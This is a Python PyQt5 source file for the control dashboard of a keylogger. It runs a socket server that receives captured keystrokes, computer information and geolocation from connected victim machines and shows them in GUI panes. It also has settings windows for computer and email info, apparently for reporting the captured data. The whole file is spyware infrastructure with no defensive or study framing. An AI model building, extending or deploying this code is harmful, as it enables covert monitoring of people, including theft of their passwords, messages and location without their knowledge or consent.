import sys
import socket
from PyQt5.QtWidgets import QApplication, QMainWindow
from gui.controllers.Dashboard import Ui_MainWindow
from gui.controllers.SetComputerInfo import Ui_SetComputerInfo
from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo
from PyQt5.QtCore import pyqtSignal, QThread
from config import config


class Worker(QThread):
    keylog_signal = pyqtSignal(str)
    computer_info_signal = pyqtSignal(str)
    geo_location_signal = pyqtSignal(str)
    client_connected_signal = pyqtSignal(str)
    client_disconnected_signal = pyqtSignal()

    def __init__(self):
        super().__init__()
        self.client_socket = None
        self.client_id = None

    def run(self):
        bindsocket = socket.socket()
        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Get server config
        host = config.get('server', 'host')
        port = config.get('server', 'port')
        backlog = config.get('server', 'listen_backlog')

        bindsocket.bind((host, port))
        bindsocket.listen(backlog)
        print(f"[*] Server listening on {host}:{port}")

        while True:
            try:
                print("[*] Waiting for client connection...")
                newsocket, fromaddr = bindsocket.accept()
                self.client_id = str(fromaddr)
                self.client_socket = newsocket
                print(f"[+] Client {self.client_id} connected")

                # Emit signal that client connected
                self.client_connected_signal.emit(self.client_id)

                # Handle the client
                self.handle_client()

            except Exception as e:
                print(f"[!] Error accepting client connection: {e}")

    def handle_client(self):
        buffer_size = config.get('keylogger', 'buffer_size')

        try:
            while True:
                try:
                    data = self.client_socket.recv(buffer_size).decode()
                except Exception as e:
                    print(f"[!] Error decoding data: {e}")
                    break

                if data:
                    print(f"[+] Data received: {data[:50]}...")  # Truncate for cleaner logs
                    self.handle_received_data(data.strip())
                else:
                    break
        except Exception as e:
            print(f"[!] Error handling data: {e}")
        finally:
            if self.client_socket:
                self.client_socket.close()
            print(f"[-] Client disconnected")
            self.client_disconnected_signal.emit()

    def handle_received_data(self, data):
        if "COMPUTER_INFO" in data:
            print(f"[Worker] Emitting computer info")
            self.computer_info_signal.emit(data)
        elif "GEO_LOCATION" in data:
            print(f"[Worker] Emitting geo-location")
            self.geo_location_signal.emit(data)
        elif "HEARTBEAT" in data:
            # Ignore heartbeat messages (just for keeping connection alive)
            pass
        else:
            # Treat everything else as keylog data
            self.keylog_signal.emit(data)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.client_connected = False

        # Set window title from config
        window_title = config.get('gui', 'window_title')
        self.setWindowTitle(window_title)

        # Apply theme from config
        theme = config.get('gui', 'theme')
        if theme == 'dark':
            self.set_dark_mode()
        else:
            self.set_light_mode()

        # Connect UI buttons
        self.ui.SetComputerInfo.clicked.connect(self.open_set_computer_info_window)
        self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
        self.ui.RefreshButton.clicked.connect(self.refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
        self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)

        # Start server
        self.start_server_listener()

    def open_set_computer_info_window(self):
        self.child_window1 = QMainWindow()
        self.child_ui1 = Ui_SetComputerInfo()
        self.child_ui1.setupUi(self.child_window1)
        self.child_window1.show()

    def open_set_email_info_window(self):
        self.child_window2 = QMainWindow()
        self.child_ui2 = Ui_SetEmaiInfo()
        self.child_ui2.setupUi(self.child_window2)
        self.child_window2.show()

    def refresh_logs(self):
        print("[*] Refreshing logs...")
        # Clear all text fields
        self.ui.plainTextEdit.clear()
        self.ui.plainTextEdit_2.clear()
        self.ui.plainTextEdit_3.clear()

    def set_light_mode(self):
        self.setStyleSheet("background-color: white; color: black;")
        config.set('gui', 'theme', value='light')
        config.save()
        print("[*] Switched to light mode.")

    def set_dark_mode(self):
        self.setStyleSheet("background-color: #2E2E2E; color: white;")
        config.set('gui', 'theme', value='dark')
        config.save()
        print("[*] Switched to dark mode.")

    def start_server_listener(self):
        self.worker = Worker()
        self.worker.keylog_signal.connect(self.update_keylog)
        self.worker.computer_info_signal.connect(self.update_computer_info)
        self.worker.geo_location_signal.connect(self.update_geo_location)
        self.worker.client_connected_signal.connect(self.handle_client_connected)
        self.worker.client_disconnected_signal.connect(self.handle_client_disconnected)

        self.worker.start()

    def handle_client_connected(self, client_id):
        """Handle new client connection"""
        print(f"[MainWindow] Client connected: {client_id}")
        self.client_connected = True
        window_title = config.get('gui', 'window_title')
        self.setWindowTitle(f"{window_title} - Client: {client_id}")

    def handle_client_disconnected(self):
        """Handle client disconnection"""
        print(f"[MainWindow] Client disconnected")
        self.client_connected = False
        window_title = config.get('gui', 'window_title')
        self.setWindowTitle(f"{window_title} - No Client Connected")

    def update_keylog(self, log_line):
        self.ui.plainTextEdit_3.appendPlainText(log_line)

    def update_computer_info(self, info):
        print(f"[MainWindow] Updating computer info")
        self.ui.plainTextEdit.setPlainText(info)

    def update_geo_location(self, location):
        print(f"[MainWindow] Updating geo location")
        self.ui.plainTextEdit_2.setPlainText(location)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())